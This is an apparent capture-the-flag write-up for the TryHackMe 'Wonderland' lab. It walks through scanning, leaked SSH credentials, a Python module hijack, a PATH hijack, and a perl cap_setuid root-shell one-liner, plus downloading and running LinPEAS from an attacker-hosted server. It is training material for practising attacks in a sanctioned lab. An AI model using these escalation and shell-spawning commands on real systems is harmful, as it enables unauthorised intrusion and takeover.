# [Wonderland](https://tryhackme.com/room/wonderland)

## Fall down the rabbit hole and enter wonderland.

# Capture the flags

## Enter Wonderland and capture the flags.

### Obtain the flag in user.txt

_Everything is upside down here._

1. Start with a port scan to identify running services on the target machine

```bash
nmap <TARGET_IP>
```

[SCREEN01]

2. Continue enumeration to discover `/r/a/b/b/i/t` directory

```bash
gobuster dir -u http://<TARGET_IP>/r/a/b/b/i/t -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
```

3. Examine the source code of `http://<TARGET_IP>/r/a/b/b/i/t/` page. Hidden in the HTML comments, you'll find SSH credentials
   - **Credentials found:** `alice:HowDothTheLittleCrocodileImproveHisShiningTail`

[SCREEN02]

4. Use the discovered credentials to establish SSH connection

```bash
ssh alice@<TARGET_IP>
# Password: HowDothTheLittleCrocodileImproveHisShiningTail
```

5. Check sudo privileges and examine files in Alice's home directory
   - The sudo output reveals that Alice can run `walrus_and_the_carpenter.py` as the rabbit user

```bash
sudo -l
cat walrus_and_the_carpenter.py
```

[SCREEN03]

6. Analyze the Python script to identify import statements. The script imports the `random` module, which we can hijack. This exploits Python's module search path to execute our malicious `random.py` instead of the legitimate module

```bash
echo 'import os; os.system("/bin/bash")' > random.py
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

7. After gaining access as the rabbit user, explore the home directory.

```bash
whoami
ls -la /home/rabbit
```

8. Copy the `teaParty` binary for analysis

```bash
cp /home/rabbit/teaParty /tmp
```

9. Transfer the binary to your attacking machine for reverse engineering

```bash
scp alice@<TARGET_IP>:/tmp/teaParty .
```

10. Analyze the `teaParty` binary using Ghidra or similar tools. The analysis reveals:
    - The binary calls the `date` command without using absolute paths
    - This creates a PATH hijacking vulnerability

[SCREEN04]

11. Create a malicious `date` binary and manipulate the PATH environment variable. This exploits the binary's reliance on PATH resolution to execute our malicious `date` command

```bash
echo -e '#!/bin/bash\n/bin/bash' > date
chmod +x date
export PATH=/home/rabbit:$PATH
./teaParty
```

12. Download LinPEAS for comprehensive privilege escalation enumeration

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
python -m SimpleHTTPServer
```

13. Transfer and execute LinPEAS on the target

```bash
cd /tmp
wget http://10.10.106.64:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

14. LinPEAS reveals that `/usr/bin/perl` has the `cap_setuid+ep` capability, allowing privilege escalation

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

15. Navigate to the root directory and retrieve the user flag

```bash
cat /root/user.txt
```

[SCREEN05]

---

### Escalate your privileges, what is the flag in root.txt?

1. The root flag is located in `/alice/root.txt`

```bash
cat /alice/root.txt
```

[SCREEN06]
